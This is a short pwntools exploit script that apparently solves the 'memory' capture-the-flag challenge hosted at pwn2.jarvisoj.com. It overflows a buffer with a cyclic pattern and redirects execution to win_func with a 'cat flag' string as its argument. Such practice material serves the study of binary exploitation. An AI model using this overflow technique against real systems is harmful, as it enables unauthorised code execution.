#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./memory"
context.log_level = 'debug'
elf = context.binary

if sys.argv[1] == "l":
    io = process("./memory")
else:
    io = remote('pwn2.jarvisoj.com', 9876)

catflag = 0x80487E0
io.sendline(flat(cyclic(0x13 + 4), elf.sym['win_func'], catflag, catflag))

io.interactive()
